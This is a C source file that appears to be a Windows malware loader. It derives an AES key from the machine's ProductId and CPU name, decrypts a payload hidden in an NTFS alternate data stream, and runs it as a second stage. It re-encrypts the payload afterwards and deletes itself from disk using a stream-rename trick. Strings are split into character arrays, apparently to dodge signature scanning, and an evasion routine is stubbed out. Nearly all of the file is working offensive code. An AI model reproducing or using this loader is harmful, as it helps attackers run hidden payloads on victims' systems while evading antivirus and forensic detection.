#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <intrin.h>
#include "aes.c"

unsigned int hash(const char* str)
{
	unsigned int hash = 2167;
	int c;
	while (c = *str++)
		hash = ((hash << 5) + hash) + c;
	return hash;
}

void MyReadFile(const char* filename, unsigned char** buffer, long* filelen)
{
	FILE* fileptr;
	//unsigned char* buffer;
	long filelenval;

	fileptr = fopen(filename, "rb");  // Open the file in binary mode
	fseek(fileptr, 0, SEEK_END);          // Jump to the end of the file
	filelenval = ftell(fileptr);             // Get the current byte offset in the file
	*filelen = filelenval;
	rewind(fileptr);                      // Jump back to the beginning of the file

	*buffer = (unsigned char*)malloc(filelenval * sizeof(unsigned char)); // Enough memory for the file
	fread(*buffer, filelenval, 1, fileptr); // Read in the entire file
	fclose(fileptr); // Close the file
}

void MyWriteFile(const char* filename, unsigned char* buffer, long bufflen)
{
	FILE* fileptr;
	fileptr = fopen(filename, "wb");  // Open the file in binary mode
	fwrite(buffer, 1, bufflen, fileptr);
	fclose(fileptr); // Close the file
}

BOOL Evade()
{
    //Omitted
    return TRUE;
}

void deleteme()
{
	WCHAR wcPath[MAX_PATH + 1];
	RtlSecureZeroMemory(wcPath, sizeof(wcPath));

	// get the path to the current running process ctx
	GetModuleFileNameW(NULL, wcPath, MAX_PATH);

	HANDLE hCurrent = CreateFileW(wcPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	// rename the associated HANDLE's file name
	FILE_RENAME_INFO* fRename;
	LPWSTR lpwStream = L":gone";
	DWORD bslpwStream = (wcslen(lpwStream)) * sizeof(WCHAR);

	DWORD bsfRename = sizeof(FILE_RENAME_INFO) + bslpwStream;
	fRename = (FILE_RENAME_INFO*)malloc(bsfRename);
	memset(fRename, 0, bsfRename);
	fRename->FileNameLength = bslpwStream;
	memcpy(fRename->FileName, lpwStream, bslpwStream);
	//printf("bsfRename: %d; FileNameLength: %d; FileName: %ls\n", bsfRename, fRename->FileNameLength, fRename->FileName);
	SetFileInformationByHandle(hCurrent, FileRenameInfo, fRename, bsfRename);
	CloseHandle(hCurrent);

	// open another handle, trigger deletion on close
	hCurrent = CreateFileW(wcPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	// set FILE_DISPOSITION_INFO::DeleteFile to TRUE
	FILE_DISPOSITION_INFO fDelete;
	RtlSecureZeroMemory(&fDelete, sizeof(fDelete));
	fDelete.DeleteFile = TRUE;
	SetFileInformationByHandle(hCurrent, FileDispositionInfo, &fDelete, sizeof(fDelete));

	// trigger the deletion deposition on hCurrent
	CloseHandle(hCurrent);
}

void GetKeyBase(char* aeskey[], char* iv[])
{
	//Get Processor Name
	int cpuInfo[4] = { -1 };
	char CPUBrandString[0x40];
	memset(CPUBrandString, 0, sizeof(CPUBrandString));
	__cpuid(cpuInfo, 0x80000002);
	memcpy(CPUBrandString, cpuInfo, sizeof(cpuInfo));
	__cpuid(cpuInfo, 0x80000003);
	memcpy(CPUBrandString + 16, cpuInfo, sizeof(cpuInfo));
	__cpuid(cpuInfo, 0x80000004);
	memcpy(CPUBrandString + 32, cpuInfo, sizeof(cpuInfo));

	int AccessMask;
	SYSTEM_INFO systemInfo;
	GetNativeSystemInfo(&systemInfo);
	//If we are on x86 machine
	if (systemInfo.wProcessorArchitecture == 0)
	{
		AccessMask = KEY_QUERY_VALUE;
	}
	//Otherwise we are on x64
	else
	{
		GetSystemInfo(&systemInfo);
		//If process is x86
		if (systemInfo.wProcessorArchitecture == 0)
		{
			AccessMask = KEY_QUERY_VALUE | KEY_WOW64_64KEY;
		}
		//Otherwise x64
		else
		{
			AccessMask = KEY_QUERY_VALUE;
		}
	}
	char subkey[] = { 'S', 'O', 'F', 'T', 'W', 'A', 'R', 'E', '\\', 'M', 'i', 'c', 'r','o', 's', 'o', 'f', 't', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', '\\', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n', '\0' };
	char regval[] = { 'P', 'r', 'o', 'd', 'u', 'c', 't', 'I', 'd', '\0' };
	char value[255];
	char shash[16];
	char assembleiv[17];
	int i;
	HKEY key = NULL;
	DWORD BufferSize = 255;

	RegOpenKeyExA(HKEY_LOCAL_MACHINE, subkey, 0, AccessMask, &key);
	RegGetValueA(key, "", regval, RRF_RT_ANY, NULL, &value, &BufferSize);
	RegCloseKey(key);
	strcat(value, CPUBrandString);
	sprintf(shash, "%u", hash(value));

	int keylen = strlen(shash);
	int remainder = 16 - keylen;

	//Assemble IV
	strncpy(assembleiv, shash, keylen);
	for (i = 0; i < remainder; i++)
	{
		assembleiv[keylen + i] = '0';
	}
	assembleiv[keylen + remainder] = '\0';
	sprintf(iv, "%s", strrev(assembleiv));

	//Assemble Key
	strncpy(aeskey, shash, keylen);
}

int main()
{
	if(!Evade())
		return 0;
	//Initialize vars
	CHAR cPath[MAX_PATH + 1];
	RtlSecureZeroMemory(cPath, sizeof(cPath));
	unsigned char* rawshellcode;
	long rawsclen;
	char iv[16];
	char aeskey[] = {'0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'};
	char catval[] = { ':', 'd', 'e', 'b', 'u', 'g', '.', 'l', 'o', 'g', '\0' };

	GetKeyBase(&aeskey, &iv);

	// get the path to the current running process ctx
	GetModuleFileNameA(NULL, cPath, MAX_PATH);
	strcat(cPath, catval);

	//Read shellcode, decrypt, write back to ads
	MyReadFile(cPath, &rawshellcode, &rawsclen);
	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, aeskey, iv);
	AES_CTR_xcrypt_buffer(&ctx, rawshellcode, rawsclen);
	
	//First check
	if (rawshellcode[0] != 0x4d || rawshellcode[1] != 0x5a)
	{
		deleteme();
		return 0;
	}
	
	MyWriteFile(cPath, rawshellcode, rawsclen);
	
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	char cmdargs[255];
	
	// Start stage 2
	if(!CreateProcessA(NULL, cPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
	{
		deleteme();
		return 0;
	}

	//Re-encrypt shellcode, write back to ads
	AES_init_ctx_iv(&ctx, aeskey, iv);
	AES_CTR_xcrypt_buffer(&ctx, rawshellcode, rawsclen);
	Sleep(5000);
	MyWriteFile(cPath, rawshellcode, rawsclen);

	//Close handles
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}
